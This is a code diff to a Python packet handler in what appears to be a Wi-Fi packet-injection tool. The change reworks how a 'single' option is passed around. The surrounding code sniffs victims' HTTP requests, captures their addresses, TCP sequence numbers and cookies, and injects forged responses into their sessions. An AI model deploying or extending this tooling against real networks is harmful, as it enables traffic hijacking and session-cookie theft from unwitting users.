@@ -58,11 +58,14 @@ class PacketHandler(object):
 
         if 'Misc' in keyword_parameters:
             misc = keyword_parameters['Misc']
-            self.verbose = misc.verbose
             self.expSocket = misc.expSocket
+            self.single = misc.single
+            self.verbose = misc.verbose
+
         else:
-            self.verbose = False
             self.expSocket = False
+            self.single = False
+            self.verbose = False
             
         self.newvictims = []
         self.injector = Injector(self.i)
@@ -147,7 +150,7 @@ class PacketHandler(object):
             return None
 
 
-    def handle_default(self, packet, single):
+    def handle_default(self, packet):
         """Default packet handler, looks for GET requests in the TCP layer."""
         if packet.haslayer(IP) and packet.haslayer(TCP):
             ## MONITOR MODE
@@ -187,27 +190,15 @@ class PacketHandler(object):
             #print BLOCK_HOSTS
             #print request
 
-            ### Perhaps do the Victim removal from single list here?
-            if single:
-                try:
-                    TSVal, TSecr = packet.getlayer(TCP).options[2][1]
-                except:
-                    TSVal = None
-                    TSecr = None
+            try:
+                TSVal, TSecr = packet.getlayer(TCP).options[2][1]
+            except:
+                TSVal = None
+                TSecr = None
 
-                cookie = self.search_cookie(request)
-                #print (vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr)
-                return (vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr)
-            else:
-                try:
-                    TSVal, TSecr = packet.getlayer(TCP).options[2][1]
-                except:
-                    TSVal = None
-                    TSecr = None
-
-                cookie = self.search_cookie(request)
-                #print (vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr)
-                return (vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr)
+            cookie = self.search_cookie(request)
+            #print (vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr)
+            return (vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr)
         return None
 
 
@@ -411,7 +402,7 @@ class PacketHandler(object):
         return injection
 
 
-    def proc_injection(self, vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr, single):
+    def proc_injection(self, vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr, misc):
         """Process injection function using the PacketHandler.victims List.
         
         If it was set, to check if the packet belongs to any of the targets.
@@ -446,7 +437,7 @@ class PacketHandler(object):
 
                             #print injection
                             ### Broadcast injector is here
-                            self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, self.expSocket, single)
+                            self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, self.expSocket, misc)
 
                 else:
                     if (victim.mac is not None):
@@ -557,7 +548,7 @@ class PacketHandler(object):
                                 self.injector.inject(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, injection, TSVal, TSecr, self.expSocket)
 
 
-    def process(self, interface, pkt, single, args):
+    def process(self, interface, pkt, args, misc):
         """Process packets coming from the sniffer.
         
         You can override the handler with one of your own,
@@ -571,9 +562,9 @@ class PacketHandler(object):
         else:
             #ls(pkt)
             try:
-                vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr = self.handle_default(pkt, single)
+                vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr = self.handle_default(pkt)
                 self.cookie_mgmt(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, args)
-                self.proc_injection(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr, single)
+                self.proc_injection(vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr, misc)
             except:
                 return
  
